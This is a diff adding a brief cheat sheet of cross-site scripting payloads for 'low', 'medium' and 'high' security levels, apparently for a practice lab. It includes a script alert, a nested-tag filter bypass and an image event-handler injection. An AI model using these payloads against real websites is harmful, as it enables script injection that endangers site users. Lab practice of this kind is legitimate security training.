@@ -1,0 +1,16 @@
+*CROSS-SITE SCRIPTING (XSS)*
+
+LOW LEVEL
+
+<script>alert('YOU HAVE BEEN HACKED')</script>
+
+MEDIUM LEVEL
+
+<scr<script>ipt>alert('YOU HAVE BEEN HACKED')</script>
+
+HIGH LEVEL
+
+<img src=x onMouseOver=alert(1)>
+
+If you want to use other images, this is example link I provide:
+https://wallpaper.dog/large/20495906.jpg
